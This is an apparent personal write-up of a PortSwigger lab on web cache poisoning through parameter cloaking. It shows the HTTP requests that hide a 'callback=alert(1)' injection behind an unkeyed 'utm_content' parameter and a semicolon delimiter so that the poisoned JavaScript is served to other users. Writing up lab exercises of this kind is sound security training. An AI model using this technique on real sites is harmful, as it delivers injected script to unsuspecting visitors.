# [Parameter cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

- open the lab in burp browser
- go to `Target` -> `Site map`
- send the `/js/geolocate.js?callback=setCountryCookie` to the repeater
- send the request
- check if it is a cache oracle (it is)
- lets find a cachebuster (there are other cachebusters in the app tho)
- the query changes caches the response
- it will respond with a couple js function

```
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```

- since the setCountryCookie is in the request's query, lets try it with a different one

```
GET /js/geolocate.js?callback=alert(1) HTTP/2
...
```

```
const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

- so the request query appears in the response
- but even if this cached no user will call the specifically
- the `callback=alert(1)` needs to be hidden in the query parameters
- start a Param Miner (extension) on the request to check what query params might be unkeyed
- `Extensions` -> `Param Miner` -> `Guess Query`
- it will give back the `utm_content` as unkeyed query param
- lets test it

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=qwe HTTP/2
...
```

- send the request then change the `utm_content` value a bit and send it again
- it should gibe back a cache hit, what means that the `utm_content` is unkeyed
- lets try the following (use the `setCountryCookieTest` as a cachebuster, so dont pollute the cache for others yet)

```
GET /js/geolocate.js?callback=setCountryCookieTest&utm_content=qwe&callback=alert(1) HTTP/2
...
```

- the `utm_content=qwe` is unkeyed but the `&callback=alert(1)` is not, so the cache recognize it and cache it under a different id
- the idea is to hide it to expect that the cache server and the backend parses the the query differently
- if you change the second `&` to a `;` the cache server might not see the `callback=alert(1)` because it will interpret it as a part of the `utm_content` while the backend pareses it as different params
- lets give it a try

```
GET /js/geolocate.js?callback=setCountryCookieTest&utm_content=qwe;callback=alert(1) HTTP/2
...
```

- in the response there is the `alert(1)`
- take the cachebuster out

```
GET /js/geolocate.js?callback=setCountryCookie&utm_content=qwe;callback=alert(1) HTTP/2
...
```

- send it again, until the it get cached
